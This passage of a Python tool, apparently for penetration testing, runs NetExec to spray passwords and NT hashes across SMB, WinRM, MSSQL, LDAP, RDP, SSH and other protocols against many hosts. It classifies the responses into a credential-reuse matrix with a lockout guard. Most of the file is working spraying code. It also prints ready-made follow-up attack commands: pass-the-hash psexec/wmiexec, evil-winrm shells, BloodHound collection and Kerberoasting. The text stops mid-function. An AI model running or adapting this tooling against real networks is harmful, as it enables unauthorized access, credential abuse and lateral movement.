#!/usr/bin/env python3
"""
salvo.py - fire every protocol at once and fill the credential reuse matrix.

A salvo is every weapon discharged simultaneously. nxc takes ONE protocol per
invocation; this runs all of them at once, for every credential you hold,
against every host you know, and prints the result as a matrix instead of ten
separate scrollbacks.

DESIGN RULE - AUTHENTICATION ONLY.
This tool never passes -x, -X, -M, --sam, --lsa, --ntds or any execution or
dumping flag to nxc. It logs in and reports. Nothing else. That keeps it
unambiguously inside restricted-tooling rules: it is a scheduler for a
tool you are already allowed to run manually.

THE THING IT DOES THAT YOU DO NOT DO BY HAND:
it has three result buckets, not two. VALID / INVALID / INCONCLUSIVE.
A WinRM refusal, an ACCESS_DENIED, a LOGON_TYPE_NOT_GRANTED - none of those
mean the password is wrong. Collapsing them into "failed" is how a live
credential gets thrown away at hour twelve.

Stdlib only - no pip, no virtualenv, no dependencies beyond nxc itself.
"""

import argparse
import hashlib
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

STATE_VERSION = 1

# ---------------------------------------------------------------------------
# Determinism helpers
#
# Two identical invocations must produce byte-identical output. Results arrive
# in thread-completion order, which is not stable, so nothing is ever printed
# or serialised in arrival order - everything sorts through these.
# ---------------------------------------------------------------------------


def ip_sort_key(addr):
    """Numeric sort for IPv4, lexical fallback for hostnames and IPv6."""
    try:
        parts = [int(x) for x in addr.split(".")]
        if len(parts) == 4 and all(0 <= p <= 255 for p in parts):
            return (0, tuple(parts), "")
    except (ValueError, AttributeError):
        pass
    return (1, (), str(addr))


def write_json_atomic(path, obj):
    """
    Write via a temp file and rename. An interrupted write leaves the previous
    file intact rather than a half-parsed one - which matters when the thing
    being written is the state file you are about to resume from.
    """
    tmp = path + ".tmp"
    with open(tmp, "w") as fh:
        json.dump(obj, fh, indent=2, sort_keys=True)
        fh.flush()
        os.fsync(fh.fileno())
    os.replace(tmp, path)

# ---------------------------------------------------------------------------
# Protocol tables
# ---------------------------------------------------------------------------

# every protocol nxc 1.5.x exposes
ALL_PROTOCOLS = ["smb", "winrm", "wmi", "mssql", "ldap", "rdp", "ssh", "ftp", "nfs", "vnc"]

# default spray set for a password - the ones that take user+pass and matter in AD
DEFAULT_PW_PROTOCOLS = ["smb", "winrm", "wmi", "mssql", "ldap", "rdp", "ssh", "ftp"]

# protocols that accept -H (pass-the-hash). ssh/ftp/nfs/vnc cannot PTH.
HASH_CAPABLE = {"smb", "winrm", "wmi", "mssql", "ldap", "rdp"}

# protocols that accept --local-auth
LOCAL_AUTH_CAPABLE = {"smb", "winrm", "wmi", "mssql", "ldap", "rdp"}

# default nxc port per protocol, used only for the follow-up command hints
DEFAULT_PORT = {
    "smb": 445,
    "winrm": 5985,
    "wmi": 135,
    "mssql": 1433,
    "ldap": 389,
    "rdp": 3389,
    "ssh": 22,
    "ftp": 21,
    "nfs": 111,
    "vnc": 5900,
}

# ---------------------------------------------------------------------------
# Result statuses
# ---------------------------------------------------------------------------

ADMIN = "ADMIN"                # authenticated AND provably administrative
EXEC = "EXEC"                  # command execution, but privilege NOT established
VALID = "VALID"                # authenticated, no execution
CRED_OK_ACCESS_NO = "BLOCKED"  # password is CORRECT, this access path is closed
INCONCLUSIVE = "UNKNOWN"       # cannot tell - treat as still-live, retest elsewhere
INVALID = "INVALID"            # confirmed wrong credential
LOCKED = "LOCKED"              # account lockout - stop everything
NO_SERVICE = "NOSVC"           # port closed / no such service on that host
ERROR = "ERROR"                # nxc itself failed

# What nxc's "Pwn3d!" actually proves, per protocol. This is not cosmetic:
#   smb    - Pwn3d means write access to ADMIN$/C$. That IS local admin.
#   mssql  - Pwn3d means the sysadmin role on the instance.
#   winrm  - Pwn3d only means the account can execute. Membership in
#            Remote Management Users grants that on its own, with no admin
#            rights whatsoever. Reading this as admin is a real trap.
#   ssh    - nxc probes for uid 0 or passwordless sudo. Against Windows
#            OpenSSH those probes return nonsense. Treat as execution only.
#   others - execution at best.
PWN_MEANING = {
    "smb":   (ADMIN, "write access to admin shares - this is local admin"),
    "mssql": (ADMIN, "sysadmin role on the SQL instance"),
    "winrm": (EXEC,  "can execute - Remote Management Users grants this WITHOUT admin"),
    "wmi":   (EXEC,  "can execute - privilege not established"),
    "rdp":   (EXEC,  "interactive logon allowed - privilege not established"),
    "ssh":   (EXEC,  "shell access - nxc's root check is unreliable, especially on Windows"),
    "ftp":   (EXEC,  "write access to the FTP root"),
    "vnc":   (EXEC,  "session access - privilege not established"),
    "nfs":   (EXEC,  "write access to an export"),
    "ldap":  (EXEC,  "privileged bind - privilege not established"),
}

# how each status renders in the matrix
GLYPH = {
    ADMIN: "ADMIN",
    EXEC: "exec",
    VALID: "ok",
    CRED_OK_ACCESS_NO: "VALID*",
    INCONCLUSIVE: "?",
    INVALID: ".",
    LOCKED: "LOCK!",
    NO_SERVICE: "-",
    ERROR: "err",
}

# ordering for "which status wins" when one host+protocol produces several lines
SEVERITY = {
    ADMIN: 100,
    EXEC: 95,
    VALID: 90,
    CRED_OK_ACCESS_NO: 80,
    LOCKED: 75,
    INCONCLUSIVE: 50,
    ERROR: 20,
    INVALID: 10,
    NO_SERVICE: 0,
}

# ---------------------------------------------------------------------------
# NT status string -> meaning.
# The middle group is the whole point of this tool: the credential is CORRECT.
# ---------------------------------------------------------------------------

STATUS_MAP = [
    # (substring to look for, bucket, human explanation)
    ("STATUS_ACCOUNT_LOCKED_OUT",      LOCKED,              "account is LOCKED OUT - stop spraying now"),
    ("KDC_ERR_CLIENT_REVOKED",         LOCKED,              "kerberos: account locked or disabled"),

    ("STATUS_LOGON_TYPE_NOT_GRANTED",  CRED_OK_ACCESS_NO,   "password correct, account denied this logon type"),
    ("STATUS_ACCOUNT_DISABLED",        CRED_OK_ACCESS_NO,   "password correct, account disabled"),
    ("STATUS_ACCOUNT_EXPIRED",         CRED_OK_ACCESS_NO,   "password correct, account expired"),
    ("STATUS_PASSWORD_EXPIRED",        CRED_OK_ACCESS_NO,   "password correct but expired - can often still be changed"),
    ("STATUS_PASSWORD_MUST_CHANGE",    CRED_OK_ACCESS_NO,   "password correct, must be changed at next logon"),
    ("STATUS_ACCOUNT_RESTRICTION",     CRED_OK_ACCESS_NO,   "password correct, workstation/time restriction"),
    ("STATUS_INVALID_LOGON_HOURS",     CRED_OK_ACCESS_NO,   "password correct, outside permitted logon hours"),
    ("STATUS_INVALID_WORKSTATION",     CRED_OK_ACCESS_NO,   "password correct, not allowed from this host"),
    ("STATUS_NOT_SUPPORTED",           CRED_OK_ACCESS_NO,   "auth mechanism refused, not a credential failure"),

    ("STATUS_ACCESS_DENIED",           INCONCLUSIVE,        "authenticated then authorization denied - cred may be live"),
    ("STATUS_TRUSTED_RELATIONSHIP",    INCONCLUSIVE,        "machine trust issue, not a credential verdict"),
    ("STATUS_NO_LOGON_SERVERS",        INCONCLUSIVE,        "no DC reachable - retest, not a credential verdict"),
    ("STATUS_NETWORK_SESSION_EXPIRED", INCONCLUSIVE,        "session expired mid-auth - retest"),
    ("STATUS_IO_TIMEOUT",              NO_SERVICE,          "timed out"),
    ("STATUS_CONNECTION_RESET",        NO_SERVICE,          "connection reset"),

    ("STATUS_LOGON_FAILURE",           INVALID,             "wrong username or password"),
    ("KDC_ERR_PREAUTH_FAILED",         INVALID,             "kerberos pre-auth failed - wrong password"),
    ("KDC_ERR_C_PRINCIPAL_UNKNOWN",    INVALID,             "no such principal in this domain"),
    ("STATUS_NO_SUCH_USER",            INVALID,             "no such user"),
]

# protocols where a bare "[-]" with no NT status code is genuinely ambiguous.
# WinRM is the big one: a valid account not in Remote Management Users looks
# identical to a wrong password.
AMBIGUOUS_BARE_FAILURE = {"winrm", "rdp", "wmi", "ldap", "mssql"}

ANSI_RE = re.compile(r"\x1b\[[0-9;]*[a-zA-Z]")
LINE_RE = re.compile(
    r"^(?P<proto>[A-Z0-9]+)\s+"      # SMB / WINRM / MSSQL ...
    r"(?P<ip>[0-9a-fA-F:.]+)\s+"     # target address
    r"(?P<port>\d+)\s+"              # port
    r"(?P<host>\S+)\s+"              # netbios / hostname column
    r"(?P<rest>.*)$"                 # [+] / [-] / [*] and the message
)


def strip_ansi(s):
    return ANSI_RE.sub("", s)


# ---------------------------------------------------------------------------
# Credential model
# ---------------------------------------------------------------------------

class Cred:
    def __init__(self, user, secret, is_hash, domain=None, local=False, idx=0):
        self.user = user
        self.secret = secret
        self.is_hash = is_hash
        self.domain = domain
        self.local = local
        self.idx = idx          # position in the input list - fixes render order

    @property
    def label(self):
        kind = "H" if self.is_hash else "P"
        shown = self.secret if len(self.secret) <= 34 else self.secret[:31] + "..."
        if self.local:
            return "LOCAL\\{}:{} [{}]".format(self.user, shown, kind)
        if self.domain:
            return "{}\\{}:{} [{}]".format(self.domain, self.user, shown, kind)
        # No -d and no --local-auth. Printing "DOMAIN\" here would read as if a
        # domain had been applied when nxc was in fact left to guess.
        return "{}:{} [{}]  (no -d given - nxc guessed the scope)".format(
            self.user, shown, kind)

    @property
    def key(self):
        return (self.user, self.secret, self.is_hash, self.domain, self.local)

    @property
    def fingerprint(self):
        """Short stable id, safe for filenames. Disambiguates two passwords
        for the same user, which would otherwise share one log file."""
        blob = "|".join([
            self.user, self.secret, str(self.is_hash),
            self.domain or "", str(self.local),
        ])
        return hashlib.sha256(blob.encode("utf-8", "replace")).hexdigest()[:8]

    def to_dict(self):
        return {
            "user": self.user, "secret": self.secret, "is_hash": self.is_hash,
            "domain": self.domain, "local": self.local,
        }

    @classmethod
    def from_dict(cls, d, idx=0):
        return cls(d["user"], d["secret"], d["is_hash"], d.get("domain"),
                   d.get("local", False), idx)


def job_signature(cred, proto, targets):
    """
    Stable id for one unit of work. Any change to the credential, the protocol,
    or the target list produces a different signature, so a resumed run never
    silently skips a job whose scope has moved.
    """
    payload = json.dumps(
        {"cred": cred.to_dict(), "proto": proto, "targets": sorted(targets)},
        sort_keys=True,
    )
    return hashlib.sha256(payload.encode("utf-8", "replace")).hexdigest()[:16]


HASH_RE = re.compile(r"^(?:[a-fA-F0-9]{32}:)?[a-fA-F0-9]{32}$")


def looks_like_hash(s):
    """32-hex NT hash, or the LM:NT pair form."""
    return bool(HASH_RE.match(s.strip()))


def parse_cred_file(path):
    """
    One credential per line. Accepted forms:
        user:password
        user:31d6cfe0d16ae931b73c59d7e0c089c0
        user:aad3b435b51404eeaad3b435b51404ee:31d6cfe0...
        DOMAIN\\user:password
    Blank lines and lines starting with # are ignored.
    """
    out = []
    with open(path, "r", errors="replace") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            user, secret = line.split(":", 1)
            dom = None
            if "\\" in user:
                dom, user = user.split("\\", 1)
            user = user.strip().lstrip("\\")
            dom = dom.strip().rstrip("\\") if dom else None
            out.append((dom, user, secret.strip(), looks_like_hash(secret)))
    return out


class State:
    """
    Resume store. Records which (credential, protocol, target-set) jobs have
    already completed, and the results they produced.

    Why this exists: every protocol you spray is a real authentication attempt
    against a real lockout counter. If the VM hangs at job 30 of 44 and you
    re-run, the naive tool re-fires all 44. This one re-fires 14. The results
    from the first 30 are merged back in, so the matrix you end up looking at
    is complete even though no single process ever saw all of it.

    A job is only recorded complete when nxc exited cleanly and the run was
    not aborted. Anything else is left unrecorded and will be retried, which
    is the safe direction to fail.
    """

    def __init__(self, path):
        self.path = path
        self.jobs = {}
        self.lock = threading.Lock()
        self.dirty = False
        self.ignore = False   # --no-resume: keep the file, but skip nothing

    def load(self):
        if not self.path or not os.path.isfile(self.path):
            return 0
        try:
            with open(self.path) as fh:
                data = json.load(fh)
        except (ValueError, OSError) as exc:
            sys.stderr.write("[!] state file unreadable ({}), starting fresh\n".format(exc))
            return 0
        if data.get("version") != STATE_VERSION:
            sys.stderr.write("[!] state file is version {}, expected {} - starting fresh\n"
                             .format(data.get("version"), STATE_VERSION))
            return 0
        self.jobs = data.get("jobs", {})
        return len(self.jobs)

    def is_done(self, sig):
        return (not self.ignore) and sig in self.jobs

    def prior_hits(self, sig, cred):
        """Rebuild Hit objects from a completed job so they merge into the matrix."""
        out = []
        for r in self.jobs.get(sig, {}).get("hits", []):
            out.append(Hit(cred, r["protocol"], r["ip"], r["port"],
                           r["hostname"], r["status"], r["note"], r["raw"]))
        return out

    def complete(self, sig, cred, proto, targets, hits):
        with self.lock:
            self.jobs[sig] = {
                "cred": cred.to_dict(),
                "protocol": proto,
                "targets": sorted(targets),
                "completed": datetime.now().isoformat(timespec="seconds"),
                "hits": [h.as_dict() for h in hits],
            }
            self.dirty = True

    def save(self):
        if not self.path or not self.dirty:
            return
        with self.lock:
            write_json_atomic(self.path, {
                "version": STATE_VERSION,
                "updated": datetime.now().isoformat(timespec="seconds"),
                "jobs": self.jobs,
            })
            self.dirty = False


# ---------------------------------------------------------------------------
# Result model
# ---------------------------------------------------------------------------

class Hit:
    __slots__ = ("cred", "proto", "ip", "port", "host", "status", "note", "raw")

    def __init__(self, cred, proto, ip, port, host, status, note, raw):
        self.cred = cred
        self.proto = proto
        self.ip = ip
        self.port = port
        self.host = host
        self.status = status
        self.note = note
        self.raw = raw

    def as_dict(self):
        return {
            "user": self.cred.user,
            "secret": self.cred.secret,
            "is_hash": self.cred.is_hash,
            "domain": self.cred.domain,
            "local_auth": self.cred.local,
            "protocol": self.proto,
            "ip": self.ip,
            "port": self.port,
            "hostname": self.host,
            "status": self.status,
            "note": self.note,
            "raw": self.raw,
        }


def classify(proto, rest):
    """
    Turn one nxc output line into (status, note).
    Everything hinges on being honest about what we cannot tell.
    """
    upper = rest.upper()

    if rest.startswith("[+]"):
        if "PWN3D" in upper or "(ADMIN)" in upper:
            # What "Pwn3d!" proves depends entirely on the protocol.
            # See PWN_MEANING - winrm and ssh are the traps.
            return PWN_MEANING.get(proto, (EXEC, "elevated access reported by nxc"))
        return VALID, "authenticated"

    if rest.startswith("[-]"):
        for needle, bucket, note in STATUS_MAP:
            if needle in upper:
                return bucket, note
        # no NT status code at all
        if proto in AMBIGUOUS_BARE_FAILURE:
            return INCONCLUSIVE, (
                "refused with no status code - on {} this cannot be told apart "
                "from an authorization denial. Do not write the cred off.".format(proto)
            )
        return INVALID, "authentication refused"

    if rest.startswith("[*]"):
        return None, None  # banner / info line, not a verdict

    return None, None


def classify_error(text):
    low = text.lower()
    if "connection refused" in low or "no route to host" in low:
        return NO_SERVICE, "port closed / host unreachable"
    if "timed out" in low or "timeout" in low:
        return NO_SERVICE, "timed out"
    return ERROR, text.strip()[:120]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

class Runner:
    def __init__(self, args, state=None):
        self.args = args
        self.state = state
        self.hits = []
        self.lock = threading.Lock()
        self.abort = threading.Event()
        self.procs = []
        self.hostnames = {}   # ip -> hostname learned from [*] banner lines
        self.os_hint = {}     # ip -> "windows", learned from SMB banner lines
        self.seen_domains = set()   # domains the targets advertised themselves
        self.logdir = args.logdir
        self.skipped = 0

    def build_cmd(self, cred, proto, targets):
        """
        nxc generic options come BEFORE the protocol. Protocol options after.
        Getting that order wrong is the number one nxc syntax mistake.
        """
        cmd = [self.args.nxc_bin]
        cmd += ["-t", str(self.args.nxc_threads)]           # nxc's own per-target concurrency
        if self.args.nxc_timeout:
            cmd += ["--timeout", str(self.args.nxc_timeout)]
        if self.args.jitter:
            cmd += ["--jitter", self.args.jitter]
        cmd += ["--no-progress"]                            # progress bar corrupts parsing
        cmd += [proto]
        cmd += list(targets)
        cmd += ["-u", cred.user]
        cmd += ["-H" if cred.is_hash else "-p", cred.secret]
        if cred.local and proto in LOCAL_AUTH_CAPABLE:
            cmd += ["--local-auth"]
        elif cred.domain and not cred.local:
            cmd += ["-d", cred.domain]
        cmd += ["--continue-on-success"]                    # without this you stop at hit one
        return cmd

    def logpath_for(self, cred, proto):
        if not self.logdir:
            return None
        # fingerprint keeps two passwords for the same user in separate files
        name = "{}_{}_{}_{}.log".format(
            proto, re.sub(r"[^A-Za-z0-9_.-]", "_", cred.user),
            "hash" if cred.is_hash else "pw", cred.fingerprint)
        return os.path.join(self.logdir, name)

    def run_one(self, cred, proto, targets, sig):
        if self.abort.is_set():
            return
        cmd = self.build_cmd(cred, proto, targets)
        logpath = self.logpath_for(cred, proto)
        job_hits = []

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except FileNotFoundError:
            self.record(Hit(cred, proto, "-", 0, "-", ERROR, "nxc not found", ""))
            return

        with self.lock:
            self.procs.append(proc)

        # truncating open, not append - a re-run of the same job replaces its
        # log rather than growing it
        logfh = open(logpath, "w") if logpath else None
        clean = False
        try:
            for raw in proc.stdout:
                if logfh:
                    logfh.write(raw)
                line = strip_ansi(raw.rstrip("\n"))
                if not line.strip():
                    continue
                m = LINE_RE.match(line)
                if not m:
                    continue
                ip = m.group("ip")
                host = m.group("host")
                rest = m.group("rest").strip()
                port = int(m.group("port"))

                # If the hostname column was blank, the regex will have eaten
                # the "[+]" marker as the hostname. Push it back.
                if host.startswith("["):
                    rest = (host + " " + rest).strip()
                    host = ip

                if host and host not in ("None", "-"):
                    self.hostnames.setdefault(ip, host)

                # Banner lines are not verdicts, but they carry the two facts
                # that make later verdicts honest: the OS, and the real domain.
                if rest.startswith("[*]"):
                    low = rest.lower()
                    if "windows" in low:
                        self.os_hint[ip] = "windows"
                    dm = re.search(r"\(domain:([^)]*)\)", rest)
                    if dm and dm.group(1).strip():
                        self.seen_domains.add(dm.group(1).strip())

                status, note = classify(proto, rest)
                if status is None:
                    continue

                hit = Hit(cred, proto, ip, port, self.hostnames.get(ip, host),
                          status, note, rest)
                job_hits.append(hit)
                self.record(hit)

                if status == LOCKED and not self.args.no_lockout_guard:
                    self.trigger_abort(hit)
            clean = True
        finally:
            if logfh:
                logfh.close()
            try:
                proc.wait(timeout=5)
            except Exception:
                proc.kill()

        # Only a clean, unaborted, zero-exit job is recorded as done. Anything
        # else stays unrecorded so the next run retries it.
        if (self.state and clean and not self.abort.is_set()
                and proc.returncode == 0):
            self.state.complete(sig, cred, proto, targets, job_hits)

    def record(self, hit):
        with self.lock:
            self.hits.append(hit)
        if self.args.stream:
            print(fmt_live(hit))

    def trigger_abort(self, hit):
        if self.abort.is_set():
            return
        self.abort.set()
        sys.stderr.write(
            "\n" + "!" * 70 + "\n"
            "  LOCKOUT DETECTED on {} ({}) as {}\n"
            "  Every remaining job has been killed.\n"
            "  Check the policy before you touch this domain again:\n"
            "      nxc smb <DC_IP> -u '' -p '' --pass-pol\n"
            "  Re-run with --no-lockout-guard only if you know what you are doing.\n"
            .format(hit.ip, hit.proto, hit.cred.user)
            + "!" * 70 + "\n\n"
        )
        self.kill_all()

    def kill_all(self):
        with self.lock:
            for p in self.procs:
                try:
                    p.kill()
                except Exception:
                    pass

    def finalize(self):
        """
        Post-pass. Some verdicts can only be judged once every protocol has
        reported, because the evidence arrives from a different nxc process.

        Runs on the merged hit list (this run plus anything resumed), so it is
        idempotent and re-applies correctly on every invocation.
        """
        for h in self.hits:
            if h.proto == "ssh" and h.status == EXEC and self.os_hint.get(h.ip) == "windows":
                h.note = ("shell on a WINDOWS host - nxc's root/sudo probe is "
                          "meaningless against Windows OpenSSH. Expect a standard "
                          "user in cmd.exe.")

    def advisories(self):
        """Things worth saying once, after the matrix, that are not verdicts."""
        out = []
        given = {c for c in [self.args.domain] if c}
        undeclared = {d for d in self.seen_domains if d and d.lower() not in
                      {g.lower() for g in given}}
        if undeclared and not self.args.local_auth:
            for d in sorted(undeclared):
                out.append("The targets advertise the domain '{}'. You did not pass -d. "
                           "Re-run with -d {} before trusting ldap, or any "
                           "Kerberos-backed result.".format(d, d))
        return out

    def attempts_made(self):
        """
        Authentication attempts that ACTUALLY happened, per account.
        A '-' cell never reached authentication, so it never touched a lockout
        counter. The pre-run warning is a worst case; this is the real bill.
        """
        counted = {}
        for (_ck, _ip, _p), h in collapse(self.hits).items():
            if h.status in (NO_SERVICE, ERROR):
                continue
            counted[h.cred.user] = counted.get(h.cred.user, 0) + 1
        return counted

    def plan(self, creds, protocols, targets):
        """
        Expand to concrete jobs, then drop any already answered in the state
        file. Returns the list still to run.
        """
        jobs = []
        for cred in creds:
            for proto in protocols:
                if cred.is_hash and proto not in HASH_CAPABLE:
                    continue  # cannot pass-the-hash over ssh/ftp/nfs/vnc
                sig = job_signature(cred, proto, targets)
                if self.state and self.state.is_done(sig):
                    self.skipped += 1
                    # pull the earlier results forward so the matrix is whole
                    with self.lock:
                        self.hits.extend(self.state.prior_hits(sig, cred))
                    continue
                jobs.append((cred, proto, targets, sig))
        return jobs

    def execute(self, jobs):
        if not jobs:
            print("[*] nothing left to run - every job is already answered in the state file\n")
            return
        print("[*] {} nxc process(es), {} at a time{}\n".format(
            len(jobs), self.args.parallel,
            "  ({} skipped, already answered)".format(self.skipped) if self.skipped else ""))

        started = time.time()
        try:
            with ThreadPoolExecutor(max_workers=self.args.parallel) as pool:
                futs = [pool.submit(self.run_one, *j) for j in jobs]
                for f in as_completed(futs):
                    try:
                        f.result()
                    except Exception as exc:
                        sys.stderr.write("[!] job error: {}\n".format(exc))
        except KeyboardInterrupt:
            # Do not lose the run. Stop the processes, keep the results, let
            # main() render and persist what was already learned.
            self.abort.set()
            self.kill_all()
            sys.stderr.write("\n[!] interrupted - keeping results gathered so far\n")
        finally:
            if self.state:
                self.state.save()
        print("\n[*] finished in {:.0f}s".format(time.time() - started))


def quote(s):
    """Proper shell quoting - a password containing a quote must not produce
    a command that silently means something else when pasted."""
    return shlex.quote(s)


def fmt_live(hit):
    tag = {
        ADMIN: "[ADMIN]",
        EXEC: "[EXEC ]",
        VALID: "[  +  ]",
        CRED_OK_ACCESS_NO: "[VALID*]",
        INCONCLUSIVE: "[  ?  ]",
        LOCKED: "[LOCK!]",
        INVALID: "[  -  ]",
        NO_SERVICE: "[ nosvc]",
        ERROR: "[ err ]",
    }[hit.status]
    return "{:8} {:6} {:<16} {:<16} {}".format(
        tag, hit.proto, hit.ip, hit.host[:16], hit.cred.user
    )


# ---------------------------------------------------------------------------
# Matrix rendering
# ---------------------------------------------------------------------------

def collapse(hits):
    """
    (cred_key, ip, proto) -> single best hit.
    nxc emits several lines per host; keep the most significant. Ties break on
    the raw text so the winner is stable across runs.
    """
    best = {}
    for h in hits:
        k = (h.cred.key, h.ip, h.proto)
        cur = best.get(k)
        if cur is None:
            best[k] = h
        elif SEVERITY[h.status] > SEVERITY[cur.status]:
            best[k] = h
        elif SEVERITY[h.status] == SEVERITY[cur.status] and h.raw < cur.raw:
            best[k] = h
    return best


def ordered_creds(hits):
    """Credentials in input order, not thread-completion order."""
    seen = {}
    for h in hits:
        seen.setdefault(h.cred.key, h.cred)
    return OrderedDict(
        (c.key, c) for c in sorted(seen.values(), key=lambda c: (c.idx, c.label))
    )


def ordered_hosts(hits):
    """Hosts sorted numerically by address, hostname taken from any line that has one."""
    names = {}
    for h in hits:
        if h.host not in ("-", "", None) and h.host != h.ip:
            names.setdefault(h.ip, h.host)
    ips = {h.ip for h in hits if h.ip != "-"}
    return OrderedDict((ip, names.get(ip, ip)) for ip in sorted(ips, key=ip_sort_key))


def render_matrix(hits, protocols, markdown=False):
    if not hits:
        return "no results.\n"

    best = collapse(hits)
    creds = ordered_creds(hits)
    hosts = ordered_hosts(hits)

    out = []
    for ckey, cred in creds.items():
        rows = []
        for ip, hostname in hosts.items():
            cells = []
            any_signal = False
            for p in protocols:
                hit = best.get((ckey, ip, p))
                if hit is None:
                    cells.append("")
                else:
                    cells.append(GLYPH[hit.status])
                    if hit.status in (ADMIN, EXEC, VALID, CRED_OK_ACCESS_NO,
                                      INCONCLUSIVE, LOCKED):
                        any_signal = True
            label = ip if hostname in ("-", ip, "") else "{} ({})".format(ip, hostname)
            rows.append((label, cells, any_signal))

        if markdown:
            out.append("\n### {}\n".format(cred.label))
            out.append("| host | " + " | ".join(protocols) + " |")
            out.append("|---" * (len(protocols) + 1) + "|")
            for label, cells, _ in rows:
                out.append("| {} | ".format(label) + " | ".join(c or GLYPH[NO_SERVICE] for c in cells) + " |")
        else:
            out.append("\n" + "=" * 78)
            out.append(" {}".format(cred.label))
            out.append("=" * 78)
            width = max([len(r[0]) for r in rows] + [12])
            header = "{:<{w}}".format("host", w=width) + "".join("{:>8}".format(p) for p in protocols)
            out.append(header)
            out.append("-" * len(header))
            for label, cells, sig in rows:
                mark = " <" if sig else ""
                out.append("{:<{w}}".format(label, w=width)
                           + "".join("{:>8}".format(c or GLYPH[NO_SERVICE]) for c in cells) + mark)
    out.append("")
    out.append("  ADMIN  = provably administrative (smb admin-share write, mssql sysadmin)")
    out.append("  exec   = code execution, NOT admin - check the smb column before assuming")
    out.append("  ok     = authenticated    VALID* = password correct, this access path blocked")
    out.append("  ?      = cannot tell, retest elsewhere    . = refused    - = no service / no answer")
    out.append("  <      = this host answered on at least one protocol")
    out.append("")
    return "\n".join(out) + "\n"


# ---------------------------------------------------------------------------
# Follow-up command suggestions
# ---------------------------------------------------------------------------

def secret_flag(cred):
    return ("-H " + cred.secret) if cred.is_hash else ("-p " + quote(cred.secret))


# which protocol to reach for first once you have access on several
PROTO_RANK = {"winrm": 0, "smb": 1, "mssql": 2, "ssh": 3, "rdp": 4, "wmi": 5, "ftp": 6, "ldap": 7}

# appended to any command that lands you a shell without admin being proven
NO_ADMIN_NOTE = "   # NOT local admin here - expect to land as a standard user"


def commands_for(h, admin_here=False):
    """
    Follow-up commands for one usable result.

    admin_here says whether ANY protocol on this host proved administrative
    rights. If not, every shell command gets flagged - because an `exec` on
    WinRM or SSH will drop you in as a standard user, and finding that out by
    watching a privileged read fail is an expensive way to learn it.

    Only ADMIN / EXEC / VALID get here. A BLOCKED result means that exact
    access path is closed, so handing back a command for it would be a lie.
    """
    c, ip, proto = h.cred, h.ip, h.proto
    dom = c.domain or "."
    sec = quote(c.secret)
    shell_note = "" if admin_here else NO_ADMIN_NOTE
    out = []

    if proto == "winrm":
        if c.is_hash:
            out.append("evil-winrm -i {} -u {} -H {}{}".format(ip, c.user, c.secret, shell_note))
        else:
            out.append("evil-winrm -i {} -u {} -p {}{}".format(ip, c.user, sec, shell_note))
    elif proto == "smb":
        if h.status == ADMIN:
            if c.is_hash:
                out.append("impacket-psexec  -hashes :{} {}/{}@{}".format(c.secret, dom, c.user, ip))
                out.append("impacket-wmiexec -hashes :{} {}/{}@{}".format(c.secret, dom, c.user, ip))
            else:
                out.append("impacket-psexec  {}/{}:{}@{}".format(dom, c.user, sec, ip))
                out.append("impacket-wmiexec {}/{}:{}@{}".format(dom, c.user, sec, ip))
        else:
            out.append("nxc smb {} -u {} {} --shares   # non-admin still reads shares"
                       .format(ip, c.user, secret_flag(c)))
    elif proto == "mssql":
        if c.is_hash:
            out.append("impacket-mssqlclient {}@{} -hashes :{} -windows-auth"
                       .format(c.user, ip, c.secret))
        else:
            out.append("impacket-mssqlclient {}:{}@{} -windows-auth".format(c.user, sec, ip))
    elif proto == "rdp":
        out.append("xfreerdp3 /u:{} /p:{} /v:{} /cert:ignore /drive:kali,/home/kali{}"
                   .format(c.user, sec, ip, shell_note))
    elif proto == "ssh":
        out.append("ssh {}@{}{}".format(c.user, ip, shell_note))
    elif proto == "ftp":
        out.append("ftp {}   # login {} / {}".format(ip, c.user, c.secret))
    elif proto == "wmi" and h.status == ADMIN:
        out.append("impacket-wmiexec {}/{}:{}@{}".format(dom, c.user, sec, ip))
    return out


def next_moves(hits):
    """
    Grouped by host, best access first. LDAP is emitted once at the end
    because it is a domain-wide action, not a per-host one.
    """
    best = collapse(hits)
    by_host = {}
    ldap_hits = []

    for (_, ip, proto), h in best.items():
        if h.status not in (ADMIN, EXEC, VALID):
            continue
        if proto == "ldap":
            ldap_hits.append(h)
            continue
        by_host.setdefault(ip, []).append(h)

    # prefer an admin LDAP bind, then the lowest address - never dict order
    ldap_cred = None
    if ldap_hits:
        ldap_cred = sorted(ldap_hits,
                           key=lambda h: (-SEVERITY[h.status], ip_sort_key(h.ip),
                                          h.cred.idx, h.cred.user))[0]

    blocks = []
    ordered = sorted(
        by_host.items(),
        key=lambda kv: (-max(SEVERITY[x.status] for x in kv[1]), ip_sort_key(kv[0])),
    )
    for ip, hs in ordered:
        hs.sort(key=lambda x: (-SEVERITY[x.status], PROTO_RANK.get(x.proto, 99),
                               x.proto, x.cred.idx, x.cred.user, x.cred.secret))
        # was admin PROVEN anywhere on this host, by any protocol?
        admin_here = any(x.status == ADMIN for x in hs)
        label = hs[0].host if hs[0].host not in ("-", "", ip) else ip
        head = "  {} ({})".format(ip, label) if label != ip else "  {}".format(ip)
        head += "   " + ", ".join("{}:{}".format(x.proto, GLYPH[x.status]) for x in hs)
        if not admin_here:
            head += "   [no admin proven on this host]"
        blocks.append(head)
        for h in hs:
            for cmd in commands_for(h, admin_here):
                blocks.append("      " + cmd)

    if ldap_cred is not None:
        c = ldap_cred.cred
        blocks.append("  domain-wide (LDAP bind works as {})".format(c.user))
        blocks.append("      nxc ldap {} -u {} {} --bloodhound -c All --dns-server {}"
                      .format(ldap_cred.ip, c.user, secret_flag(c), ldap_cred.ip))
        blocks.append("      nxc ldap {} -u {} {} --kerberoasting kerb.hashes"
                      .format(ldap_cred.ip, c.user, secret_flag(c)))
    return blocks


def inconclusive_report(hits):
    """
    Group by (user, protocol, reason) so three hosts giving the same answer
    print as one line with three addresses, not three identical paragraphs.
    """
    best = collapse(hits)
    grouped = {}
    for (_, ip, proto), h in best.items():
        if h.status in (INCONCLUSIVE, CRED_OK_ACCESS_NO):
            grouped.setdefault((h.cred.user, proto, h.note), []).append(ip)

    out = []
    for (user, proto, note), ips in sorted(grouped.items()):
